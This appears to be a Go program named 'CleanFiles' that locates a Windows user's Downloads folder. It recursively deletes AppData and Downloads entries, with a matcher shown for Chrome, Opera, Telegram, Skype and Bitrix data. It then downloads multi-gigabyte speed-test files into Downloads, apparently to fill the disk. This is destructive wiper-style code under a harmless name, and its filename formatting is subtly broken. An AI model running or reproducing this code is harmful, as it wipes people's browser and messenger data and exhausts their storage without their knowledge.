package main

import (
	"CleanFiles/logger"
	"fmt"
	"os"
	"os/user"
	"strconv"
	"strings"
)

func main() {
	var links = []string{
		"http://ipv4.download.thinkbroadband.com/512MB.zip",
		"https://speed.hetzner.de/1GB.bin",
		"http://ipv4.download.thinkbroadband.com/1GB.zip",
		"http://speedtest-sgp1.digitalocean.com/5gb.test",
		"https://speed.hetzner.de/10GB.bin"}

	log := logger.New()
	log.Println("starting...")
	defer log.Println("Done!")

	user, errusr := user.Current()
	if errusr != nil {
		log.Println(errusr)
	}
	ctlguser := fmt.Sprintf("C:\\Users\\%s\\Downloads", strings.Split(user.Username, "\\")[1])

	searchProcess(log)

	chann := appdata(log)
	for ctlg := range chann {
		err := os.RemoveAll(ctlg)
		if err != nil {
			log.Println(err)
		}
	}

	chann2 := downloads(log, ctlguser)
	for ctlg := range chann2 {
		err := os.RemoveAll(ctlg)
		if err != nil {
			log.Println(err)
		}
	}

	for i, l := range links {
		createNullFile(log, ctlguser, strconv.Itoa(i))
		flname := fmt.Sprintf("%s\\%s", ctlguser, i)
		errdown := DownloadFile(flname, l)
		if errdown != nil {
			log.Println(errdown)
		}
	}

	return

}

func containsProgs(x string) bool {
	var progs = []string{"chrome", "telegram", "opera", "bitrix", "skype"}
	//var progs = []string{"chddddrome"}
	for _, n := range progs {
		if strings.Contains(strings.ToLower(x), n) {
			return true
		}
	}
	return false
}
